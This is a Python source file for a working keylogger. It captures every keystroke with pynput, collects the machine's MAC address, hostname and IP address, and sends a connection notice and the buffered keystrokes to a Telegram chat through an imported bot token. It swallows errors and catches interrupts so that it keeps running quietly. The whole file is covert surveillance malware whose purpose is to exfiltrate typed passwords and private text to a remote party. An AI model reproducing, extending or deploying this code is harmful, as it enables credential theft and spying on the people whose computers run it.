import asyncio
import socket
import time
import uuid
from datetime import datetime
from pynput import keyboard

from tg_output_bot import bot, TOKEN, CHAT_ID

buffer_for_tg = ""

mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(5, -1, -1)])
hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)
current_date = datetime.now()

modified_time = time.time()


def on_key_event(key):
    global buffer_for_tg, modified_time
    if hasattr(key, 'char'):
        char = str(key.char)
    elif key == keyboard.Key.space:
        char = " "
    else:
        char = str(f"[{key}]")
    buffer_for_tg += char
    modified_time = time.time()


async def capture_kb():
    listener = keyboard.Listener(
        on_press=on_key_event)
    listener.start()


# noinspection PyBroadException
async def device_connect_msg():
    if TOKEN != "" and CHAT_ID != "":
        try:
            await bot.send_message(CHAT_ID,
                                   f"device connected:\nMAC address: {mac_address}\nHost name: "
                                   f"{hostname}\nIP address: {ip_address}")
        except Exception:
            pass


# noinspection PyBroadException
async def recursive_part():
    global buffer_for_tg, modified_time

    if buffer_for_tg != "":
        if time.time() - modified_time > 5.0:
            try:
                await bot.send_message(CHAT_ID, f"[{mac_address}]: {buffer_for_tg}")
                buffer_for_tg = ""
            except Exception:
                pass
            await asyncio.sleep(2.5)


async def main():
    try:
        await device_connect_msg()
    except KeyboardInterrupt:
        await device_connect_msg()

    try:
        await capture_kb()
    except KeyboardInterrupt:
        await capture_kb()

    while True:
        try:
            await recursive_part()
        except KeyboardInterrupt:
            await recursive_part()


asyncio.run(main())
